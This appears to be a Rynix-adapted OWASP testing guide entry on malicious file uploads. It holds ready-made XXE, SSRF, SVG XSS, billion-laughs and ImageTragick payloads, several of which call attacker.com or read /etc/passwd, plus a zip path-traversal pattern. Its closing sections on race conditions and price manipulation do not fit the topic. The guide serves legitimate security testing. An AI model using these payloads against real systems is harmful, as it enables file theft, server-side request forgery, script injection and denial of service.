---
id: WSTG-BUSL-09
title: Test Upload of Malicious Files
category: Business Logic
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
---

# WSTG-BUSL-09: Test Upload of Malicious Files

## Summary

Beyond uploading unexpected file types, attackers may upload files containing malicious content: malware, virus-laden documents, zip bombs designed to exhaust server resources, XML files with XXE payloads, SVG files with embedded scripts, or documents with malicious macros. Proper upload handling must include content inspection, antivirus scanning, and safe processing to prevent server compromise, cross-site scripting, denial of service, or malware distribution.

## Test Objectives

- Test if uploaded files are scanned for malware and malicious content
- Test server-side processing of uploaded XML files for XXE vulnerabilities
- Upload SVG files with embedded JavaScript for XSS
- Test zip bomb and archive-based denial of service
- Assess handling of files with embedded macros or exploits

## Prerequisites

- Target application has file upload functionality
- Docker pentest container capturing traffic
- Test payloads prepared (EICAR test file, crafted XML, SVG, zip files)

## Test Steps

### Step 1: Test Antivirus Scanning with EICAR Test File

**CLI Actions:**
Use `curl` to upload the EICAR antivirus test string (not actual malware, but triggers AV scanners):

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
------Boundary--
```

If the file is accepted without triggering any security alert, AV scanning may not be in place.

### Step 2: Test XXE via Uploaded XML Files

**CLI Actions:**
Use `curl` to upload XML files with XXE payloads:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="data.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
------Boundary--
```

Test blind XXE via out-of-band:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

Test XXE in document formats that use XML internally (DOCX, XLSX, PPTX, SVG).

### Step 3: Test SVG with Embedded JavaScript

**CLI Actions:**
Use `curl` to upload an SVG file containing JavaScript:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="image.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>alert('XSS')</script>
  <circle cx="50" cy="50" r="40" />
</svg>
------Boundary--
```

After upload, use `curl` to access the uploaded SVG and check if JavaScript executes:

```
GET /uploads/image.svg HTTP/1.1
Host: target.com
```

Check response headers: if served as `image/svg+xml` without `Content-Disposition: attachment`, the script will execute in the browser.

### Step 4: Test Zip Bomb / Decompression Bomb

**CLI Actions:**
Use `curl` to upload a small file that expands to an enormous size when decompressed. Create a test payload:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="archive.zip"
Content-Type: application/zip

<binary zip bomb content>
------Boundary--
```

Indicators that the server is vulnerable:
- Server timeout or 500 error after processing
- Memory or disk space exhaustion
- Slow response indicating attempted extraction of the archive

Also test nested archives (zip within zip within zip).

### Step 5: Test XXE in Office Documents

**CLI Actions:**
Office documents (DOCX, XLSX, PPTX) are ZIP archives containing XML files. Modify the internal XML to include XXE payloads:

Use `curl` to upload a crafted DOCX:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="document.docx"
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

<binary docx with XXE in [Content_Types].xml>
------Boundary--
```

The XXE is triggered if the server parses the XML within the document.

### Step 6: Test Malicious PDF Uploads

**CLI Actions:**
Use `curl` to upload PDF files with embedded JavaScript or form actions:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

%PDF-1.4
<crafted PDF with JavaScript action>
------Boundary--
```

Check if the PDF is served to other users and if the embedded actions execute in their PDF viewers.

### Step 7: Test Image Processing Vulnerabilities

**CLI Actions:**
Use `curl` to upload crafted image files that exploit image processing libraries (e.g., ImageMagick, PIL):

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="exploit.png"
Content-Type: image/png

<crafted image file exploiting processing library>
------Boundary--
```

Use `rynix_plugin_run('template-scan')` to check for file upload-related findings.

## Payloads

### EICAR Antivirus Test String
```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

### XXE Payloads for XML Uploads
```
# File read
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

# SSRF
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>

# Blind XXE
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root>data</root>

# Billion laughs (DoS)
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>
```

### SVG XSS Payloads
```
<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>

<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>

<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('XSS')"><rect width="100" height="100"/></a></svg>

<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert('XSS')</script></body></foreignObject></svg>
```

### ImageMagick Exploit Payloads
```
# ImageTragick (CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/image.jpg"|id")'
pop graphic-context
```

### Malicious Archive Patterns
```
# Zip bomb indicators
Small file (<1MB) that extracts to >1GB
Nested zip archives (10+ levels deep)
Zip with path traversal entries (../../etc/cron.d/evil)
Zip with symlinks pointing to sensitive files
```

## Detection Criteria

A finding should be logged when:
- EICAR test file is accepted without antivirus alert
- XXE payloads in uploaded XML trigger external entity processing
- SVG files with JavaScript execute when served to users
- Zip bombs cause server resource exhaustion
- Office documents with XXE payloads trigger entity processing
- Image files exploit processing library vulnerabilities
- No content scanning or sanitization is applied to uploaded files
- Malicious PDFs are served to other users without sanitization

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| XXE in uploaded XML/DOCX achieves file read or SSRF | Critical |
| Image processing exploit achieves RCE (e.g., ImageTragick) | Critical |
| Zip bomb causes denial of service or server crash | High |
| SVG with JavaScript served to other users (stored XSS) | High |
| No antivirus scanning on uploaded files (malware distribution risk) | Medium |
| XXE attempted but entity expansion limits prevent exploitation | Medium |
| Malicious PDF served but JavaScript restricted by viewer | Medium |
| Zip files extracted but size limits prevent bomb effectiveness | Low |
| All uploads scanned, sanitized, and served safely | Not a finding |

## Remediation

- Implement server-side antivirus scanning on all uploaded files
- Disable external entity processing in XML parsers (prevent XXE)
- Sanitize SVG files: strip script elements, event handlers, and foreign objects
- Implement decompression limits: maximum extracted size, maximum nesting depth, maximum file count
- Re-encode uploaded images using a safe library (strip metadata and embedded payloads)
- Serve uploaded files from a separate domain with restrictive CSP
- Add `Content-Disposition: attachment` for all downloaded files
- Add `X-Content-Type-Options: nosniff` to prevent MIME sniffing
- Validate archive contents before extraction: check paths, sizes, and file types
- Use sandboxed environments for file processing
- Implement file size limits for both compressed and uncompressed content
- Convert Office documents to PDF for safe viewing instead of processing XML directly

## References

- [OWASP Testing Guide - Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-409: Improper Handling of Highly Compressed Data](https://cwe.mitre.org/data/definitions/409.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V11 Business Logic — workflow integrity and limit enforcement.
- V4 Access Control — state transitions require proper authorization.

## CWE references

- CWE-840: Business Logic Errors
- CWE-362: Race Condition

## Rynix tooling

- Primary tools: ``http_probe``, ``compare_role_response``, ``record_finding``

## Test focus

- Test price/quantity manipulation and workflow step skipping.
- Parallel requests for race windows on limits and balances.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

